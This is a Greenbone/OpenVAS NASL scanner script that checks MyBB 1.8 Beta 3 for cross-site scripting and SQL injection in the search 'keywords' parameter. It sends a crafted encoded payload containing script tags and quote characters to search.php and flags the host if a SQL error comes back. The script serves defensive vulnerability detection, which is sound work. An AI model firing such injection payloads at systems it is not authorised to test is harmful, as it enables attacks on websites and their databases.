# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mybb:mybb";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804747");
  script_version("2025-09-05T15:40:40+0000");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2025-09-05 15:40:40 +0000 (Fri, 05 Sep 2025)");
  script_tag(name:"creation_date", value:"2014-08-21 18:16:52 +0530 (Thu, 21 Aug 2014)");

  script_tag(name:"qod_type", value:"remote_app");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("MyBB Multiple Vulnerabilities (Aug 2014)");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("mybb/http/detected");

  script_tag(name:"summary", value:"MyBB is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it
  is able to execute sql query or not.");

  script_tag(name:"insight", value:"Flaw is due to the install/index.php, private.php,
  showthread.php, search.php, misc.php, forumdisplay.php scripts which do not properly sanitize
  user-supplied input via the 'keywords' parameter.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary HTML and script code in a user's browser session or execute arbitrary SQL statements on
  the vulnerable system, which may leads to access or modify data in the underlying database.");

  script_tag(name:"affected", value:"MyBB version 1.8 Beta 3.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34381");
  script_xref(name:"URL", value:"https://rstforums.com/forum/88566-mybb-1-8-beta-3-cross-site-scripting-sql-injection.rst");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

url = dir + "/search.php";

payload = "action=do_search&keywords=%3Cfoo%3E+%3Ch1%3E+%3Cscript%3E+" +
          "alert+%28bar%29+%28%29+%3B+%2F%2F+%27+%22+%3E+%3C+prompt+%" +
          "5Cx41+%2542+constructor+onload&postthread=1&author=&matchu" +
          "sername=1&forums%5B%5D=all&findthreadst=1&numreplies=&post" +
          "date=0&pddir=1&sortby=lastpost&sortordr=desc&showresults=t" +
          "hreads&submit=Search";

req = http_post(item:url, port:port, data:payload);
res = http_send_recv(port:port, data:req);

if(res && res =~ "You have an error in your SQL syntax.*constructor onload") {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
}

exit(0);
